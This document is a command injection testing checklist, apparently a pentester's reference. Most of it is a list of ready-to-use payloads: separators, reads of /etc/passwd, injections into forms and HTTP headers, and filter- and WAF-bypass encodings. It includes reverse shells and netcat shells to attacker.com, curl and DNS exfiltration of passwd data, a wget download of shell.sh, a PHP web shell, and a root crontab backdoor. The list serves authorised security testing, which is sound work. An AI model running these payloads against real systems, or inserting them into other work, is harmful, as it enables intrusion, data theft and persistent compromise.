# 🔍 COMMAND INJECTION TESTING CHECKLIST

 ## Comprehensive Command Injection Testing

### 1 Basic Command Injection Vectors
    - Shell Metacharacter Testing:
      * Command separators: ;, &&, ||, &
      * Pipe operators: |, |&
      * Redirection operators: >, <, >>, 2>, 2>&1
      * Subshell execution: $(), ``
      * Command grouping: {}, ()
      * Background process: &

    - Common Injection Patterns:
      * Simple command: ; whoami
      * Chained commands: && cat /etc/passwd
      * Conditional execution: || id
      * Piped commands: | ls -la
      * Output redirection: > /var/www/html/test.txt

    - Basic Payload Testing:
      * System information: ; uname -a
      * File listing: && ls -la /
      * User context: || whoami
      * Network information: ; ifconfig
      * Process listing: | ps aux

### 2 Operating System-Specific Testing
    - Linux/Unix Systems:
      * Shell command injection: ; /bin/sh -c "whoami"
      * Multiple command chaining: ; cat /etc/passwd; ls -la
      * Environment variable usage: $PATH, $HOME
      * Wildcard exploitation: * *
      * Special files: /dev/null, /dev/tcp

    - Windows Systems:
      * Command separators: &, &&, |, ||
      * Batch file operators: %0a, %0d, %0d%0a
      * PowerShell injection: ; powershell -c "Get-Process"
      * Windows commands: dir, type, netstat, ipconfig
      * Registry operations: reg query, reg add

    - Cross-Platform Techniques:
      * Python command execution: ; python -c "import os; os.system('whoami')"
      * Perl command execution: ; perl -e "system('whoami')"
      * Node.js injection: ; node -e "require('child_process').exec('whoami')"
      * PHP system calls: ; php -r "system('whoami');"

### 3 Input Vector Testing
    - Web Form Parameters:
      * Search functionality: test; whoami
      * Contact forms: name=test&email=test@test.com; nc -e /bin/sh attacker.com 4444
      * File upload fields: filename="test; whoami; jpg"
      * User registration: username=admin; id

    - URL Parameter Testing:
      * GET parameters: ?ip=127.0.0.1; whoami
      * REST API endpoints: /api/ping?host=127.0.0.1|whoami
      * GraphQL queries with command parameters
      * SOAP web service parameters

    - HTTP Header Testing:
      * User-Agent: Mozilla; whoami
      * X-Forwarded-For: 127.0.0.1; id
      * Cookie: session=abc; cat /etc/passwd
      * Referer: http://site.com; whoami
      * Custom headers with command injection

### 4 Context-Aware Injection Testing
    - System Command Contexts:
      * Ping functionality: 127.0.0.1; whoami
      * DNS lookup: google.com; cat /etc/passwd
      * Traceroute: example.com && whoami
      * Network scanning: 192.168.1.1/24 | whoami
      * Port checking: localhost; id

    - File Operation Contexts:
      * File upload: filename="test; whoami; jpg"
      * File download: ; wget http://attacker.com/shell.sh
      * File compression: ; tar -czf /tmp/backup.tar.gz /etc/passwd
      * File conversion: test.jpg; whoami
      * File parsing: data.csv | whoami

    - Application-Specific Contexts:
      * Email systems: test@test.com; whoami
      * Database operations: '; whoami; #
      * Log processing: test\nwhoami
      * Backup systems: ; whoami
      * Monitoring systems: hostname; id

### 5 Advanced Injection Techniques
    - Blind Command Injection:
      * Time-based detection: ; sleep 5
      * DNS exfiltration: ; nslookup $(whoami).attacker.com
      * HTTP-based exfiltration: ; curl http://attacker.com/$(cat /etc/passwd | base64)
      * File-based detection: ; touch /tmp/test_success
      * Network-based detection: ; ping -c 1 attacker.com

    - Out-of-Band Exploitation:
      * Reverse shells: ; bash -i >& /dev/tcp/attacker.com/4444 0>&1
      * Bind shells: ; nc -lvp 4444 -e /bin/bash
      * Web shells: ; echo "<?php system($_GET['cmd']); ?>" > /var/www/html/shell.php
      * Wget/cURL file download: ; wget http://attacker.com/shell.sh -O /tmp/shell.sh

    - Privilege Escalation:
      * Sudo exploitation: ; sudo -l
      * SUID binaries: ; find / -perm -4000 2>/dev/null
      * Cron job manipulation: ; echo "* * * * * root /bin/bash -i >& /dev/tcp/attacker.com/4444 0>&1" >> /etc/crontab
      * Service exploitation: ; systemctl list-units

### 6 Encoding and Obfuscation
    - Character Encoding:
      * URL encoding: %3b%20whoami
      * HTML encoding: &#59; whoami
      * Base64 encoding: ; echo "d2hvYW1p" | base64 -d | bash
      * Hex encoding: ; echo "77686f616d69" | xxd -r -p | bash
      * Unicode encoding

    - Case and Whitespace Manipulation:
      * Case variation: ; WhOaMi
      * Mixed case: ; WhOaMi
      * Tab characters: ;%09whoami
      * Newline injection: %0a whoami
      * Carriage return: %0d whoami

    - Special Character Obfuscation:
      * Variable expansion: ; w$@hoami
      * Brace expansion: ; w{h o a m}i
      * IFS manipulation: ; IFS=_;whoami
      * Backslash escaping: ; w\h\o\a\m\i
      * Quote variations: ; 'whoami', ; "whoami"

### 7 Filter Bypass Techniques
    - Blacklist Evasion:
      * Command fragmentation: ; w'h'o'a'm'i
      * Backticks and subshells: ; `whoami`
      * Environment variables: ; $0whoami
      * Wildcard characters: ; /???/??s???
      * Character repetition: ; whoooooooooooami

    - Whitespace Bypass:
      * Tab characters: cat</etc/passwd
      * IFS manipulation: cat${IFS}/etc/passwd
      * Brace expansion: {cat,/etc/passwd}
      * Redirection operators: cat</etc/passwd
      * No whitespace: ;cat/etc/passwd

    - WAF Bypass Techniques:
      * Case randomization: ; wHoAmI
      * Double URL encoding: %253b%2520whoami
      * Unicode normalization
      * HTTP parameter pollution
      * Chunked transfer encoding

### 8 Application Framework Testing
    - PHP Applications:
      * system(), exec(), passthru(), shell_exec()
      * Backtick operator: `whoami`
      * popen(), proc_open()
      * PHP wrappers: expect://

    - Java Applications:
      * Runtime.exec() exploitation
      * ProcessBuilder manipulation
      * JNI native code execution
      * Groovy shell execution

    - NET Applications:
      * System.Diagnostics.Process.Start()
      * Process class exploitation
      * PowerShell invocation
      * WMI command execution

    - Python Applications:
      * os.system(), os.popen()
      * subprocess.Popen(), subprocess.call()
      * exec(), eval()
      * Command string manipulation

    - Node.js Applications:
      * child_process.exec(), child_process.spawn()
      * execSync(), spawnSync()
      * Shell parameter exploitation
      * Buffer/string manipulation

### 9 Network Service Testing
    - SMTP/IMAP Services:
      * Email address injection: test; whoami@domain.com
      * Header injection with commands
      * Attachment filename exploitation

    - DNS Services:
      * Hostname command injection: google.com; whoami
      * DNS query manipulation
      * Zone transfer exploitation

    - DHCP Services:
      * Hostname parameter injection
      * Client identifier manipulation
      * DHCP option exploitation

    - Network Management:
      * SNMP community string injection
      * NTP server manipulation
      * Syslog message injection

### 10 File Format Exploitation
    - Archive Files:
      * Zip file comment injection
      * Tar filename command injection
      * RAR archive exploitation

    - Document Files:
      * PDF metadata injection
      * Office document property manipulation
      * Image metadata (EXIF) injection

    - Configuration Files:
      * YAML deserialization: !!python/object/apply:os.system ["whoami"]
      * JSON command injection
      * XML external entity with command execution

### 11 Defense Bypass Testing
    - Input Validation Bypass:
      * Null byte injection: ; whoami%00
      * Multiple encoding layers
      * Character set confusion
      * Parser differential attacks

    - Security Control Testing:
      * Web Application Firewall (WAF) evasion
      * Intrusion Detection System (IDS) bypass
      * Application whitelist circumvention
      * System hardening bypass

    - Container/VM Escape:
      * Docker container escape
      * Kubernetes pod breakout
      * Hypervisor escape attempts
      * Namespace breakout

#### Testing Tools and Methodologies:
    Manual Testing Tools:
    - Burp Suite with command injection scanner
    - OWASP ZAP with active scan rules
    - Custom payload lists for different contexts
    - Browser developer tools for client-side testing

    Automated Testing Tools:
    - Commix (automated command injection tool)
    - SQLMap with os-shell capability
    - Custom Python scripts for command fuzzing
    - Nuclei templates for command injection

    Specialized Testing Tools:
    - Reverse shell payload generators
    - Command obfuscation tools
    - Encoding/decoding utilities
    - Network traffic analyzers

    Test Case Examples:
    - Basic: ; whoami
    - Chained: && cat /etc/passwd
    - Blind: ; sleep 5
    - Encoded: %3b%20whoami
    - Obfuscated: ; w'h'o'a'm'i

    Testing Methodology:
    1. Identify all user input vectors
    2. Test basic command separators
    3. Attempt OS-specific payloads
    4. Test context-aware injection
    5. Verify blind injection techniques
    6. Attempt encoding and obfuscation
    7. Test defense bypass methods
    8. Document exploitation paths and impact